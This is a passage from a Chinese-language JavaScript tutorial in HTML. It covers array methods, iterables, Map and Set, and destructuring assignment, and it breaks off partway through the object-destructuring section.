<h2 id="concat-arg1-arg2-…"><a href="#concat-arg1-arg2-…" class="headerlink" title="concat(arg1, arg2, …)"></a>concat(arg1, arg2, …)</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.concat(<span class="number">5</span>, [<span class="number">7</span>,<span class="number">9</span>]); <span class="comment">// [1,2,3,5,7,9]</span></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;Will&quot;</span>&#125;;</span><br><span class="line">arr.concat(obj1); <span class="comment">// [1,2,3,&#123;id: 1, name: &quot;Will&quot;&#125;]</span></span><br></pre></td></tr></table></figure>
<h2 id="遍历：forEach"><a href="#遍历：forEach" class="headerlink" title="遍历：forEach"></a>遍历：forEach</h2><p>array.forEach可以实现为数组中的每个元素都运行一个函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [...];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>用例如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Nottingham&quot;</span>, <span class="string">&quot;London&quot;</span>, <span class="string">&quot;Manchestor&quot;</span>];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;item&#125;</span> is at index <span class="subst">$&#123;index&#125;</span> in <span class="subst">$&#123;array&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="indexOf-lastIndexOf-includes"><a href="#indexOf-lastIndexOf-includes" class="headerlink" title="indexOf, lastIndexOf, includes"></a>indexOf, lastIndexOf, includes</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// arr.indexOf(item, from); 从索引from开始找item，找到返回index，否则返回-1</span></span><br><span class="line"><span class="comment">// arr.lastindexOf(item, from); 同上，但从右向左</span></span><br><span class="line"><span class="comment">// arr.includes(item, from); 从索引from开始搜索item，找到返回true，否则返回false</span></span><br><span class="line"></span><br><span class="line">arr.indexOf(<span class="number">2</span>, <span class="number">1</span>); <span class="comment">// 1</span></span><br><span class="line">arr.includes(<span class="number">3</span>); <span class="comment">// true </span></span><br></pre></td></tr></table></figure>
<h3 id="find-findindex"><a href="#find-findindex" class="headerlink" title="find, findindex"></a>find, findindex</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> result = arr.find(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 返回true，则搜索停止并返回item</span></span><br><span class="line">  <span class="comment">// 返回false则返回undefined</span></span><br><span class="line">&#125;)；</span><br></pre></td></tr></table></figure>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> users = [</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="number">1</span>,<span class="attr">name</span>:<span class="string">&quot;Will&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="number">2</span>,<span class="attr">name</span>:<span class="string">&quot;Dion&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="number">3</span>,<span class="attr">name</span>:<span class="string">&quot;Akshay&quot;</span>&#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user = users.find(<span class="function">(<span class="params">user</span>)=&gt;</span>&#123;<span class="keyword">return</span> user.id==<span class="number">1</span>&#125;);</span><br><span class="line">user.name; <span class="comment">// &quot;Will&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="filter⭐️"><a href="#filter⭐️" class="headerlink" title="filter⭐️"></a>filter⭐️</h3><p>与find的类似，不过区别在于如果其返回true，搜索会继续直到遍历完整个数组，并返回所有匹配元素组成的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = users.filter(<span class="function"><span class="params">user</span> =&gt;</span> item.id &lt;= <span class="number">2</span>);</span><br><span class="line">user.length; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="转换数组"><a href="#转换数组" class="headerlink" title="转换数组"></a>转换数组</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>对数组中的每个元素调用map参数中的该函数，并返回结果数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res = arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 返回新值而不是当前元素</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> names = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Dions&quot;</span>, <span class="string">&quot;Akshay&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> lengths = names.map(<span class="function"><span class="params">name</span> =&gt;</span> name.length);</span><br><span class="line">lengths; <span class="comment">// [4,5,6]</span></span><br></pre></td></tr></table></figure>
<h3 id="sort-—-in-place"><a href="#sort-—-in-place" class="headerlink" title="sort — in-place"></a>sort — in-place</h3><p>对数组进行原位（in-place）排序，更改数组中元素的顺序，其语法为<code>数组.sort(排序函数)</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a&gt;b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (a==b) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (a&lt;b) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr.sort(compare); <span class="comment">// [1,2,4,9]</span></span><br><span class="line">arr; <span class="comment">// [1,2,4,9]</span></span><br></pre></td></tr></table></figure>
<p><strong>实际上，排序函数可以返回任意数字（正数代表”大于”，负数代表”小于”）；同时使用箭头函数会更简洁</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">2</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>];</span><br><span class="line">arr.sort( <span class="function">(<span class="params">a,b</span>) =&gt;</span> a-b ); <span class="comment">//[1,2,8,9]</span></span><br><span class="line">arr; <span class="comment">// [1,2,8,9]</span></span><br></pre></td></tr></table></figure>
<p><strong>localeCompare</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> countries = [<span class="string">&#x27;Österreich&#x27;</span>, <span class="string">&#x27;Andorra&#x27;</span>, <span class="string">&#x27;Vietnam&#x27;</span>];</span><br><span class="line"></span><br><span class="line">countries.sort( <span class="function">(<span class="params">a,b</span>) =&gt;</span> a.localeCompare(b) ); <span class="comment">// [Andorra,Österreich,Vietnam]</span></span><br></pre></td></tr></table></figure>
<h3 id="reverse-—-in-place"><a href="#reverse-—-in-place" class="headerlink" title="reverse — in-place"></a>reverse — in-place</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">arr.reverse();</span><br><span class="line"></span><br><span class="line">arr; <span class="comment">// [3,2,1]</span></span><br></pre></td></tr></table></figure>
<h3 id="split-join"><a href="#split-join" class="headerlink" title="split, join"></a>split, join</h3><ol>
<li><p><strong>分割字符串为数组</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> names = <span class="string">&quot;Will, Dion, Akshay&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> arr = names.split(<span class="string">&#x27;, &#x27;</span>);</span><br><span class="line">arr; <span class="comment">// [&quot;Will&quot;, &quot;Dion&quot;, &quot;Akshay&quot;]</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>合并数组元素为字符串</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> strName = arr.join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">strName; <span class="comment">// &quot;Will Dion Akshay&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="reduce-reduceRight"><a href="#reduce-reduceRight" class="headerlink" title="reduce, reduceRight"></a>reduce, reduceRight</h3></li>
</ol>
<p>用于根据数组计算单个值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> value = arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">accumulator, item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;, [initial]);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>accumulator本质上是个累加器。</p>
</li>
<li><p>应用reduce函数时，它会将上一个参数函数调用的结果作为第一个参数传递给下一个函数</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> res = arr.reduce( <span class="function">(<span class="params">sum, current</span>) =&gt;</span> sum+current, <span class="number">0</span> );</span><br><span class="line">res; <span class="comment">// 15</span></span><br></pre></td></tr></table></figure>
<h3 id="Array-isArray"><a href="#Array-isArray" class="headerlink" title="Array.isArray"></a>Array.isArray</h3><p>数组是基于对象的，因此无法使用<code>typeof</code>进行判断</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> []; <span class="comment">// object</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray( [] ); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Array</span>.isArray( &#123;&#125; ); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h1 id="可迭代对象（Iterable-Object）"><a href="#可迭代对象（Iterable-Object）" class="headerlink" title="可迭代对象（Iterable Object）"></a>可迭代对象（Iterable Object）</h1><p>可迭代对象是数组的泛化，任何对象都可以被定制为可在<code>for...of</code>循环中使用的对象。</p>
<h2 id="Symbol-iterator"><a href="#Symbol-iterator" class="headerlink" title="Symbol.iterator"></a>Symbol.iterator</h2><p><strong>为对象添加一个名为<code>Symbol.iterator</code>方法，便可使其可迭代</strong></p>
<ol>
<li>当<code>for...of</code>循环时，会调用该方法，同时该方法须返回一个<strong>迭代器</strong>（即有next()方法的对象）</li>
<li>此后，<code>for...of</code>仅作用于这个被返回的迭代器</li>
<li><code>for...of</code>会调用<code>next()</code>方法来取得下一个数值</li>
<li>next()返回的结果对象格式必须为：<code>&#123;done: Boolean, value: any&#125;</code>。其中当<code>done=true</code>时，迭代结束，否则<code>value</code>为下一个值</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> range = &#123;</span><br><span class="line">  <span class="keyword">from</span>: <span class="number">1</span>,</span><br><span class="line">  to: <span class="number">5</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加一个名为Symbol.iterator方法</span></span><br><span class="line">range[<span class="built_in">Symbol</span>.iterator] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 返回一个迭代器</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    current: <span class="built_in">this</span>.from,</span><br><span class="line">    last: <span class="built_in">this</span>.to,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 加入next()方法</span></span><br><span class="line">    <span class="function"><span class="title">next</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="comment">// 返回要求格式的对象</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.current &lt;= <span class="built_in">this</span>.last) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">false</span>, <span class="attr">value</span>: <span class="built_in">this</span>.current++ &#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">done</span>:<span class="literal">true</span> &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> num <span class="keyword">of</span> range) &#123;</span><br><span class="line">  num; <span class="comment">// 1,2,3,4,5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="字符串是可迭代的"><a href="#字符串是可迭代的" class="headerlink" title="字符串是可迭代的"></a>字符串是可迭代的</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">  char; <span class="comment">// &#x27;t&#x27;, &#x27;e&#x27;, &#x27;s&#x27;, &#x27;t&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>显示调用迭代器</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> iterator = str[<span class="built_in">Symbol</span>.iterator]()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = iterator.next();</span><br><span class="line">  <span class="keyword">if</span> (res.done) <span class="keyword">break</span>;</span><br><span class="line">  res.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Array-from-—-将可迭代或类数组转化为数组对象（可使用数组的方法）"><a href="#Array-from-—-将可迭代或类数组转化为数组对象（可使用数组的方法）" class="headerlink" title="Array.from — 将可迭代或类数组转化为数组对象（可使用数组的方法）"></a>Array.from — 将可迭代或类数组转化为数组对象（可使用数组的方法）</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
<li>**Iterable(可迭代): **实现了Symbol.iterator方法的对象</li>
<li>**Array-like(类数组): **有索引和length属性的对象</li>
</ul>
<h3 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">  <span class="number">0</span>: <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">  <span class="number">1</span>: <span class="string">&quot;World&quot;</span>,</span><br><span class="line">  length: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = <span class="built_in">Array</span>.from(arrayLike);</span><br><span class="line">arr.pop(); <span class="comment">// &quot;World&quot;</span></span><br><span class="line">arr; <span class="comment">// [&quot;Hello&quot;]</span></span><br></pre></td></tr></table></figure>
<h3 id="Array-from还提供了一个可选参数—映射-mapping-函数"><a href="#Array-from还提供了一个可选参数—映射-mapping-函数" class="headerlink" title="Array.from还提供了一个可选参数—映射(mapping)函数"></a>Array.from还提供了一个可选参数—映射(mapping)函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from(obj, mapFunction, thisArg); <span class="comment">// thisArg允许我们为设置该函数设置this</span></span><br></pre></td></tr></table></figure>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="built_in">Array</span>.from(range, <span class="function"><span class="params">num</span> =&gt;</span> num * num); <span class="comment">// 该函数会被应用于数组中的每个元素</span></span><br><span class="line">arr; <span class="comment">// [1,4,9,16,25]</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串转换为数组"><a href="#字符串转换为数组" class="headerlink" title="字符串转换为数组"></a>字符串转换为数组</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> strArray = <span class="built_in">Array</span>.from(str);</span><br><span class="line"></span><br><span class="line">strArray; <span class="comment">// [&#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;]</span></span><br></pre></td></tr></table></figure>
<h1 id="Map-and-Set-—-映射和集合"><a href="#Map-and-Set-—-映射和集合" class="headerlink" title="Map and Set — 映射和集合"></a>Map and Set — 映射和集合</h1><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><ul>
<li>Map是带键的数据项，但与对象（会将其转换为字符串）不同，键可以是任意类型</li>
<li>使用set、get方法</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="keyword">let</span> will = &#123;<span class="attr">name</span>:<span class="string">&quot;Will&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">map.set(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>); <span class="comment">// 字符串键</span></span><br><span class="line">map.set(<span class="number">1</span>, <span class="string">&#x27;world&#x27;</span>); <span class="comment">// 数字键</span></span><br><span class="line">map.set(<span class="literal">true</span>, <span class="string">&#x27;!!!&#x27;</span>); <span class="comment">// 布尔值键</span></span><br><span class="line">map.set(will, <span class="number">111</span>); <span class="comment">// 对象键</span></span><br><span class="line"></span><br><span class="line">map.get(<span class="string">&#x27;1&#x27;</span>); <span class="comment">// &#x27;hello&#x27;</span></span><br><span class="line">map.get(<span class="number">1</span>); <span class="comment">// &#x27;world&#x27;</span></span><br><span class="line">map.get(<span class="literal">true</span>); <span class="comment">// &#x27;!!!&#x27;</span></span><br><span class="line">map.get(will); <span class="comment">// 111</span></span><br><span class="line"></span><br><span class="line">map.size; <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<h3 id="链式调用"><a href="#链式调用" class="headerlink" title="链式调用"></a>链式调用</h3><p><code>map.set</code>调用会返回map本身</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">map.set(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">	.set(<span class="number">1</span>, <span class="string">&#x27;world&#x27;</span>)</span><br><span class="line">	.set(<span class="literal">true</span>, <span class="string">&#x27;!!!&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Map迭代"><a href="#Map迭代" class="headerlink" title="Map迭代"></a>Map迭代</h3><p>在map中使用循环，可使用如下方法：</p>
<ul>
<li>map.keys() — 返回所有的键</li>
<li>map.values() — 返回所有的值</li>
<li>Map.entries() — 返回所有的键值对</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> recipe = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="string">&#x27;tomatoes&#x27;</span>, <span class="number">500</span>],</span><br><span class="line">  [<span class="string">&#x27;onion&#x27;</span>, <span class="number">300</span>],</span><br><span class="line">  [<span class="string">&#x27;bell pepper&#x27;</span>, <span class="number">50</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> veg <span class="keyword">of</span> recipe.keys()) &#123;</span><br><span class="line">  veg; <span class="comment">// tomatoes, onion, bell pepper</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> entry <span class="keyword">of</span> recipe.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(entry); <span class="comment">// [&#x27;tomatoes&#x27;, 500], ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>forEach</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">recipe.forEach( <span class="function">(<span class="params">value, key, map</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;key&#125;</span>: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">&#125; )</span><br></pre></td></tr></table></figure>
<h3 id="Object-entries-—-从对象—-gt-Map"><a href="#Object-entries-—-从对象—-gt-Map" class="headerlink" title="Object.entries — 从对象—&gt;Map"></a>Object.entries — 从对象—&gt;Map</h3><p><code>new Map([key, value], [key, value], ...)</code></p>
<p>Object.entries()可以返回对象的键值对数组（其格式完全符合<code>Map</code>所需）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  name: <span class="string">&quot;Will&quot;</span>,</span><br><span class="line">  age: <span class="number">30</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">Object</span>.entries(obj)); <span class="comment">// Object.entries返回键值对数组[[&#x27;name&#x27;,&#x27;Will&#x27;], [&#x27;age&#x27;, 30]]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(map.get(<span class="string">&#x27;name&#x27;</span>));</span><br></pre></td></tr></table></figure>
<h3 id="Object-fromEntries-—-从Map—-gt-对象"><a href="#Object-fromEntries-—-从Map—-gt-对象" class="headerlink" title="Object.fromEntries — 从Map—&gt;对象"></a>Object.fromEntries — 从Map—&gt;对象</h3><p>给定一键值对数组返回一个对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> prices = <span class="built_in">Object</span>.fromEntries([</span><br><span class="line">  [<span class="string">&#x27;banana&#x27;</span>, <span class="number">1</span>],</span><br><span class="line">  [<span class="string">&#x27;orange&#x27;</span>, <span class="number">2</span>],</span><br><span class="line">  [<span class="string">&#x27;apple&#x27;</span>, <span class="number">3</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(prices); <span class="comment">// &#123; banana: 1, orange: 2, apple: 3 &#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><p>Set是集合并且无重复值，其方法有：</p>
<ol>
<li>new Set(iterable) — 创建一个set，如有iterable，将从其中复制值到set中</li>
<li>set.add(value) — 添加一个值并返回set</li>
<li>set.delete(value) — 删除值，如该值存在则返回true，否则返回false</li>
<li>set.has(value) — 如value存在set中，则返回true；否则返回false</li>
<li>set.clear() — 清空set</li>
<li>set.size — 返回元素个数</li>
</ol>
<h3 id="可迭代-iterable"><a href="#可迭代-iterable" class="headerlink" title="可迭代(iterable)"></a>可迭代(iterable)</h3><p>可以使用<code>for...of</code>和<code>forEach</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&quot;oranges&quot;</span>, <span class="string">&quot;apples&quot;</span>, <span class="string">&quot;bananas&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> set) <span class="built_in">console</span>.log(value);</span><br><span class="line"></span><br><span class="line">set.forEach(<span class="function">(<span class="params">value, valueAgain, set</span>) =&gt;</span> <span class="built_in">console</span>.log(value));</span><br></pre></td></tr></table></figure>
<p><strong>用于迭代的方法（同Map）</strong></p>
<ul>
<li>set.keys()</li>
<li>set.values()</li>
<li>set.entries()</li>
</ul>
<h1 id="弱映射和弱集合（WeakMap-amp-WeakSet）"><a href="#弱映射和弱集合（WeakMap-amp-WeakSet）" class="headerlink" title="弱映射和弱集合（WeakMap &amp; WeakSet）"></a>弱映射和弱集合（WeakMap &amp; WeakSet）</h1><p>略</p>
<h1 id="Object-keys-values-entries"><a href="#Object-keys-values-entries" class="headerlink" title="Object.keys, values, entries"></a>Object.keys, values, entries</h1><ul>
<li>Object.keys(obj) — 返回一个包含该对象的所有键的数组</li>
<li>Object.values(obj) — 返回一个包含该对象的所有值的数组</li>
<li>Object.entries(obj) — 返回一个包含该对象所有键值对（即[key, value]）的数组</li>
</ul>
<h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><h2 id="数组（Array）解构"><a href="#数组（Array）解构" class="headerlink" title="数组（Array）解构"></a>数组（Array）解构</h2><p>基本结构为：<code>[变量名1, 变量名2, ...]=[...]</code></p>
<ol>
<li><p><strong>变量名无所谓</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Koo&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [firstName, lastName] = arr;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>使用逗号忽略不想要的元素</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [firstName, , thirdOne] = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Sam&quot;</span>, <span class="string">&quot;Dion&quot;</span>, <span class="string">&quot;Ricky&quot;</span>];</span><br><span class="line"></span><br><span class="line">firstName; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">thirdOne; <span class="comment">// &quot;Dion&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><em><strong>任何可迭代对象都可以用数组解构赋值</strong></em></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a,b,c] = <span class="string">&quot;USA&quot;</span>;</span><br><span class="line">[a,b,c]; <span class="comment">//[&#x27;U&#x27;,&#x27;S&#x27;,&#x27;A&#x27;]</span></span><br><span class="line"><span class="keyword">let</span> [one, two, three] = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;A&#x27;</span>]);</span><br></pre></td></tr></table></figure></li>
<li><p><strong>交换变量值</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> guest = <span class="string">&quot;People&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> admin = <span class="string">&quot;Will&quot;</span>;</span><br><span class="line"></span><br><span class="line">[guest, admin] = [admin, guest];</span><br><span class="line"></span><br><span class="line">[guest, admin]; <span class="comment">// [&#x27;Will&#x27;, &quot;People&quot;]</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>剩余…</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [name1, name2, ...rest] = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Dion&quot;</span>, <span class="string">&quot;Akshay&quot;</span>, <span class="string">&quot;Ricky&quot;</span>, <span class="string">&quot;Sam&quot;</span>];</span><br><span class="line"></span><br><span class="line">rest; <span class="comment">// [&quot;Akshay&quot;, &quot;Ricky&quot;, &quot;Sam&quot;]</span></span><br></pre></td></tr></table></figure></li>
<li><p>默认值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [name1=<span class="string">&quot;Anonymous&quot;</span>, name2=<span class="string">&quot;Will&quot;</span>] = [<span class="string">&quot;Dion&quot;</span>];</span><br><span class="line"></span><br><span class="line">name1; <span class="comment">// &quot;Dion&quot;</span></span><br><span class="line">name2; <span class="comment">// &quot;Will&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h2></li>
</ol>
<p>基本语法：<code>let &#123;var1, var2, ...&#125; = &#123;var1:..., var2:..., ...&#125;</code>，其中等号左侧的变量名顺序不重要，但<strong>变量名必须与右侧对象中的属性名一致</strong>。</p>
<p>用例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> personAdmin = &#123;</span><br><span class="line">  name: <span class="string">&quot;Will&quot;</span>,</span><br><span class="line">  age: <span class="number">24</span>,</span><br><span class="line">  major: <span class="string">&quot;CS&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;name, age, major&#125; = personAdmin;</span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>更改左侧的变量名</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">name</span>: n, <span class="attr">age</span>: a, major&#125; = personAdmin;</span><br><span class="line">n; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">a; <span class="comment">// 24</span></span><br><span class="line">major; <span class="comment">// &quot;CS&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>默认值  =</strong> </p>
